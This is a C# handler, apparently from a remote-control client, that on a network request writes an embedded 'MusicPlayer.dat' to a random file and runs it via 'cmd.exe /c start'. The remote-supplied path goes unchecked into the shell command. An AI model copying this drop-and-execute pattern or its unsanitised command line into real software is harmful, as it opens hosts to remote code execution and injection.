using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Request;
using System.Windows.Forms;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client.Handlers
{
    class RequestPlayMusicHandler : IRequestHandler
    {
        private static string lastPlayMusicExeFile = null;
        public void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            if (reqType == ePacketType.PACKET_PLAY_MUSIC_REQUEST)
            {
                var req = reqObj as RequestPlayMusic;
                StopMusic();
                StartPlayMusic(session, req.MusicFilePath);
            }
            else if (reqType == ePacketType.PACKET_STOP_PLAY_MUSIC_REQUEST)
            {
                StopMusic();
            }
        }

        private void StartPlayMusic(SocketSession session, string musicFilePath)
        {
            try
            {
                // 释放音乐播放程序
                byte[] data = ResUtil.GetResFileData("MusicPlayer.dat");
                string musicPlayerFileName = ResUtil.WriteToRandomFile(data);
                lastPlayMusicExeFile = System.IO.Path.GetFileNameWithoutExtension(musicPlayerFileName);
                // 启动音乐播放程序
                ProcessUtil.Run("cmd.exe", "/c start " + musicPlayerFileName + " " + musicFilePath, true, false);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private void StopMusic()
        {
            if (lastPlayMusicExeFile != null)
            {
                ProcessUtil.KillProcess(lastPlayMusicExeFile);
            }
            //Win32API.mciSendString("close mymusic", null, 0, IntPtr.Zero);//关闭
        }
    }
}
